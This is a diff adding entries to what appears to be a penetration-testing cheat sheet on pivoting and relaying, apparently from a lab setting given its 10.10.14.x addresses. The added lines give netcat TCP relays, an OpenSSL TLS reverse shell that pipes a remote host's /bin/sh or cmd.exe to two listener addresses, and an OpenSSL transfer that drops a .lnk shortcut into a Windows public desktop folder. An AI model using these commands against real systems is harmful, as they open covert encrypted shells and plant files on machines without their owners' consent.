@@ -33,6 +33,31 @@ sshuttle
 sshuttle -r username@sshserver 0.0.0.0/0
 sshuttle --dns -r username@sshserver 0/0
 
+TCP Relaying with Netcat
+nc -lvp 22
+nc -lvp 4444 | nc localhost 22
+echo 'something' | nc localhost 4444
+
+OPENSSL Full Duplex TLS relay
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+	-create key on host
+openssl s_server -quiet -key key.pem -cert cert.pem -port 73
+	-command input terminal
+openssl s_server -quiet -key key.pem -cert cert.pem -port 136
+	-command output terminal
+ON REMOTE HOST
+openssl s_client -quiet -connect 10.10.14.15:73 | /bin/sh | openssl s_client -quiet -connect 10.10.14.6:136
+	-on *nix
+openssl.exe s_client -quiet -connect 10.10.14.15:73 | cmd.exe | openssl.exe s_client -quiet -connect 10.10.14.6:136
+	-on windows
+
+
+OPENSSL FILE UPLOAD
+localhost>
+openssl s_server -quiet -key key.pem -cert cert.pem -port 73 < VB.lnk
+remote host>
+openssl.exe s_client -quiet -connect 10.10.14.15:73 > C:\Users\Public\Desktop\Shortcuts\VB.lnk
+
 
 HTTP Tunneling
 nc -nvv 10.11.1.15 8888
